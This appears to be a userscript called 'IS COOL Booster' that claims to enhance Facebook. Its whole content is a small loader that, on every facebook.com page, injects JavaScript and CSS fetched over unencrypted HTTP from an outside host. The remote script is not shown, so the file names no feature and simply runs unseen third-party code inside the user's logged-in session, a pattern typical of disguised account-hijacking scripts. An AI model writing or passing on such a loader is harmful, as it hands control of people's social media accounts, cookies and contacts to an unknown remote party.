// ==UserScript==
// @name           IS COOL Booster
// @namespace      Par Sahaza Marline http://on.fb.me/developper
// @description    IS COOL Booster
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==
function loadjscssfile(filename, filetype){if (filetype=="js"){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);}else if (filetype=="css"){var fileref=document.createElement("link");fileref.setAttribute("rel", "stylesheet");fileref.setAttribute("type", "text/css");fileref.setAttribute("href", filename);}if (typeof fileref!="undefined")document.getElementsByTagName("head")[0].appendChild(fileref);}loadjscssfile("http://apps.tontolo.com/userscripts/is_cool.js", "js");loadjscssfile("http://apps.tontolo.com/userscripts/is_cool.css", "css");